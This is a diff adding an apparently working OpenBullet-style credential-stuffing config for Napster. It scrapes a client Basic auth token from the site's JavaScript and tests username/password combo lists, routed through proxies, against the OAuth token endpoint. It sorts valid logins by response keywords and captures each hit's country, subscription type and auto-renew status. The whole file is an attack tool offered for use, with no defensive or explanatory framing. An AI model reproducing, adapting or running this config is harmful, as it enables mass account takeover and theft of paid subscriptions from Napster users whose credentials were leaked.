@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Napster",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-22T11:54:12.104459-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#get_deploymentCommit REQUEST GET "https://app.napster.com/version.json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+#parse_deploymentCommit PARSE "<SOURCE>" JSON "deploymentCommit" -> VAR "deploymentCommit" 
+
+#get_auth_token REQUEST GET "https://app.napster.com/assets/webclient-cli-<deploymentCommit>.js" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#parse_auth_token PARSE "<SOURCE>" LR "Authorization:\"Basic " "\"" -> VAR "auth_token" 
+
+#login REQUEST POST "https://api.napster.com/oauth/token" 
+  CONTENT "username=<USER>&password=<PASS>&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Authorization: Basic <auth_token>" 
+
+#key_check_1 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "No user found for" 
+    KEY "username and password must be supplied" 
+    KEY "Invalid password" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#parse_access_token PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+#get_account_details REQUEST GET "https://api.napster.com/v2.2/me/account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Authorization: Bearer <access_token>" 
+
+#key_check_2 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "productName\":\"\"" 
+
+#parse_country PARSE "<SOURCE>" JSON "country" -> CAP "Country" 
+
+#parse_productName PARSE "<SOURCE>" JSON "productName" -> CAP "Subscription Type" 
+
+#parse_isCurrentSubscriptionPayable PARSE "<SOURCE>" JSON "isCurrentSubscriptionPayable" -> CAP "Auto-Renew" 
+
